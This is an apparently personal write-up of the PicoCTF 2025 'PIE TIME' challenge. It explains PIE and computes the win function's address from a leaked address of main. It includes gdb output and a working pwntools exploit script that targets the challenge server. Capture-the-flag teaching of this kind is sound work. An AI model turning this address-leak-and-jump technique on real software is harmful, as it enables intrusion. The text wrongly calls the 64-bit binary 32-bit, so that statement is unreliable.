# PIE TIME
This was a challenge listed in PicoCTF 2025.  It's listed as easy and categorized as a Binary Exploitation challenge.

## Description
The Description reads:
> Can you try to get the flag? Beware we have PIE!
> 
> Additional details will be available after launching your challenge instance.

After starting the instance, you are provided with the source code and a binary executable.

## Hints
There is a single hint that reads:
> Can you figure out what changed between the address you found locally and in the server output?

# Solving
## My Thoughts
This was one of those challenges that introduced a lot of new(ish) concepts to me so I really enjoyed it.  I had messed with binary exploitation of C/C++ a long time ago but this was the first time I had really buckled down and learned what I needed to.
With a 94% approval rating on the challenge, it seems like a lot of people agreed with me!  Let's get to solving.

## What is PIE?
Well the title seems to be a big old hint about what this challenge is going to be about, so let's do a little research.  A quick google search on PIE and C came up with a ton of results.  I found [this](https://ir0nstone.gitbook.io/notes/binexp/stack/pie) particular one to be fantastic for this and a few other challenges.

PIE stands for Position Independent Executable.  Waaaay back when coding was just starting out, programs were designed to load into the same memory spaces each time they started.  For anybody familiar with binary exploitation, this is obviously the root of why a lot of C vulnerabilities exist, if you can predict where data will be loaded into memory, you can access that data really easily.

PIE ensures that each time the program is loaded, it's loaded into a different spot in memory.  Pretty neat, it's not enough though!

## Source Code

Let's look through the source code really quickly to see what we're dealing with.

### Win Function
``` c
int win() {
  // Initiates a few variables that will be used later
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Tries to open the flag.txt file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Reads data from the file into the c variable and prints it out
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  // Closes the file.
  printf("\n");
  fclose(fptr);
}
```

I added some comments to help with readability but essentially this function, when called, will read and print the flag.txt file.  Obviously this should be our goal then!

### Main Function
``` c
int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  // Prints the address where the main function resides
  printf("Address of main: %p\n", &main);

  // Initiates a variable that will hold an unsigned long value.
  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  // Reads in the user input and passes it into the val variable created above.
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  // Creates a function pointer named foo and assigns it's memory address to be the address provided by the user.
  void (*foo)(void) = (void (*)())val;
  // Calls the foo pointer which will shift the program to whatever memory address the user provided.
  foo();
}
```

Interesting! So withoutout PIE this would be incredibly simple.  Using a tool like gdb, we could simply grab the memory address of the win function, pass it in, and we'd get our flag!  Since PIE is in use, the memory address will be randomized when we connect to the server, meaning things will be a little more complicated.

Let's try to get some info from the executable now.

## Executable
If we run the 'file' command on the executable, we get some valuable info:

```
vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0072413e1b5a0613219f45518ded05fc685b680a, for GNU/Linux 3.2.0, not stripped
```

As expected, this is a PIE executable.  We can also tell that this is a 32-bit executable file.

Since we have the source code, there's not a ton more info we can gather from the executable!

## PIE Demonstration

Let's demo PIE really quickly.  I've downloaded the PIE executable, and then compiled a second executable named 'vuln2' without PIE enabled.

With PIE:
![With PIE](https://github.com/user-attachments/assets/5db2d788-35a7-46e3-9305-f58937b59196)

Without PIE:
![Without PIE](https://github.com/user-attachments/assets/3c8a8530-6b8b-4efb-a31e-7eea93d58a4f)

As you can see, without PIE enabled the memory address of main remained the same, but with PIE it changed when we restarted the program.

## Exploitation Without PIE

Let's demonstrate how we can exploit this executable WITHOUT PIE enabled first, so we can get an idea of what needs to be done.  Let's boot up gdb and check the memory address of the win function:

``` bash
gdb vuln2
pwndbg> print win
$1 = {<text variable, no debug info>} 0x4011d3 <win>
pwndbg> print main
$2 = {<text variable, no debug info>} 0x401271 <main>
```
Looks like win is located at 0x4011d3, ok let's plug that into the program and see what we get!

![You (sorta) Win](https://github.com/user-attachments/assets/96aff90b-1d5e-472b-a7ba-e4731f03dfce)

Awesome, well what now?

## Exploitation With PIE

Math! With a little bit of math, and the above exploit, we can figure out where win is with the knowledge of where main starts!

We know that main is AFTER win, so if we subtract win's memory location from win's we can get the distance between the two!  So let's gather the memory locations from vuln:

``` bash
pwndbg> print win
$1 = {<text variable, no debug info>} 0x12a7 <win>
pwndbg> print main
$2 = {<text variable, no debug info>} 0x133d <main>
```
And then we can subtract 0x12a7 from 0x133d to get the distance:

``` python
>>> hex(0x133d - 0x12a7)
'0x96'
```
Ok so let's connect to the web server:

![Vuln](https://github.com/user-attachments/assets/da26b8f5-4505-40f9-80e2-b8791f518882)

So 0x56147e3cf33d - 0x96 = 0x56147e3cf2a7 so let's plug that in!

![Success](https://github.com/user-attachments/assets/10114ec9-cb9f-4e46-a0ec-1dd458f4cb2c)

Awesome! We got it.  Now let's automate it!

## Automating With Pwntools

Using a really cool python module called Pwntools, we can automate this whole process!  It's good practice.  This script also gets the win function using a different method!  The below code is heavily commented to explain each part:

``` python
#!/usr/bin/python3
from pwn import *

# Requests the port that the script should connect to.
# In PicoCTF, the base address will generally remain the same after
# a reset, but the port will change.
port = int(input("Please enter the port to connect to: "))

# Reads in the vuln binary to provide context for the program
# elf files are essentially another name for executable files
# pwntools provides the capability to parse through executables using this ELF module.
elf = context.binary = ELF('./vuln')

# Connect to remote server
p = remote("rescued-float.picoctf.net", port)

# wait for the below text to appear
p.recvuntil(b'main: ')
# Read the next 16 characters (should capture the memory location it provides)
# the program provides us with the address of main.
main = int(p.recvline(), 16)

print("Server Main Location: %s" % hex(main))
print("Local Main Location: %s" % hex(elf.sym['main']))
print("Server Program Start: %s" % hex((main - elf.sym['main'])))

# Simulates the binary and grabs the memory location of main.
# Then updates the elf file to pretend like the memory start starts where the PIE
# one starts
elf.address = main - elf.sym['main']

print("Server Win Start: %s" % hex(elf.sym['win']))

# Converts the integer PIE address of the win function to hex
# Then sends it to the nc server.
p.sendline(hex(elf.sym['win']).encode())
# Prints the output!
print(p.clean().decode('latin-1'))
```

![Auto Win](https://github.com/user-attachments/assets/1847d875-86da-490a-ac9e-449a3a633dd3)
